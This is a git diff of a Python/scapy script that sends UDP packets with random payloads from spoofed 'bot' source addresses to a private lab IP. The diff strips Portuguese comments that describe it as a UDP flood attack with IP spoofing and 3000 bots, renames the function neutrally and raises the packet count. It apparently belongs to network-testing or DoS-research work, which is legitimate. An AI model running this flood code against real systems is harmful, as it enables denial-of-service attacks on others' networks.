@@ -6,18 +6,14 @@ import sys
 import ipaddress
 import os
 
-# Ataque simples UDP Flood, com tamanho do payload aleatório e
-# string aleatória como carga.
-# IP Spoofing, RandomSRCPort e 3000 bots.
-
-# CONFIGURAÇÃO DO ATAQUE
+# UDP Random Payload
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
-BOTFILE = "bots.txt"
+BOTFILE = "../bots.txt"
+NUM_PACKETS = 100
 PACKET_PAYLOAD_SIZE = 512
 
 def load_bots(filename):
-    """Colocar os bots do arquivo em uma lista."""
     bot_ips = []
 
     with open(filename, "r") as f:
@@ -29,8 +25,7 @@ def load_bots(filename):
 
     return bot_ips
 
-def run_udp_flood_attack():
-    """UDP Flood Attack"""
+def run_udp_random_payload():
     bot_ips = load_bots(BOTFILE)
 
     numero_de_pacotes_enviados = 0
@@ -51,7 +46,7 @@ def run_udp_flood_attack():
         lista_de_pacotes.append(packet)
         numero_de_pacotes_enviados += 1
 
-        if(numero_de_pacotes_enviados == 10):
+        if(numero_de_pacotes_enviados == 100):
             break
 
 
@@ -60,13 +55,12 @@ def run_udp_flood_attack():
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nEnvio concluído.")
-    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
-
+    print(f"\nSending completed.")
+    print(f"Total time to send packets: {duration:.4f} seconds")
 
 
 if __name__ == "__main__":
-    run_udp_flood_attack()
+    run_udp_random_payload()
 
 
 # sudo PYTHONPATH=$HOME/scapy python3 udp_random_payload.py
